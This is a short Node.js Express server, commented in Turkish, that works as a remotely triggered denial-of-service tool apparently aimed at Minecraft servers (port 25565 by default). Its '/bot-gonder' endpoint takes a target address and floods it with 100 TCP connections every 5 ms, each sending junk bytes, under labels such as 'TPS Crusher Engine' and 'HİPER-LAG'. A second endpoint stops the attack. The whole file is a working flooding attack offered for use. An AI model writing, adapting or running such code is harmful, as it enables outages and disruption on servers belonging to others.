const express = require('express');
const net = require('net');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let attackStatus = false;
let threads = [];

app.get('/bot-gonder', (req, res) => {
    const { ip } = req.query;
    const [host, targetPort] = ip.split(':');
    const portNum = parseInt(targetPort) || 25565;

    if (attackStatus) return res.send("Saldırı zaten aktif!");
    
    attackStatus = true;
    console.log(`[KRITIK] ${host}:${portNum} hedefine paket fırtınası başladı!`);

    // Saniyede binlerce bağlantı denemesi için döngü
    const flood = () => {
        if (!attackStatus) return;
        
        for (let i = 0; i < 100; i++) { // Aynı anda 100 soket aç
            const client = new net.Socket();
            client.setTimeout(1000);
            
            client.connect(portNum, host, () => {
                // Bağlantı kurulur kurulmaz anlamsız veri gönder ve işlemciyi yor
                client.write(Buffer.alloc(1024, 0x00)); 
                client.destroy();
            });

            client.on('error', () => client.destroy());
            client.on('timeout', () => client.destroy());
        }
        setTimeout(flood, 5); // 5ms bekle ve tekrarla
    };

    flood();
    res.send("HİPER-LAG PROTOKOLÜ BAŞLATILDI");
});

app.get('/bot-zipla', (req, res) => res.send("SISTEM_HAZIR"));
app.get('/bot-durdur', (req, res) => {
    attackStatus = false;
    res.send("Saldırı durduruldu.");
});

app.listen(port, '0.0.0.0', () => console.log("TPS Crusher Engine Online."));
                           
